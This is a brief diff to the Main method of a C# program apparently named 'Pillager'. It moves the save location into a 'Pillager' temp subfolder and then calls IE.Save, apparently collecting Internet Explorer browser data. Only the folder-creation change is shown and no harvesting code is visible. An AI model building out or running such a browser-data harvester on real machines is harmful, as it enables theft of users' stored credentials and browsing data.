@@ -9,7 +9,11 @@ namespace Pillager
     {
         static void Main(string[] args)
         {
-            string savepath = Path.GetTempPath();
+            string savepath = Path.Combine(Path.GetTempPath(), "Pillager");
+            if (!Directory.Exists(savepath)) 
+            {
+                Directory.CreateDirectory(savepath);
+            }
 
             //IE
             IE.Save(savepath);
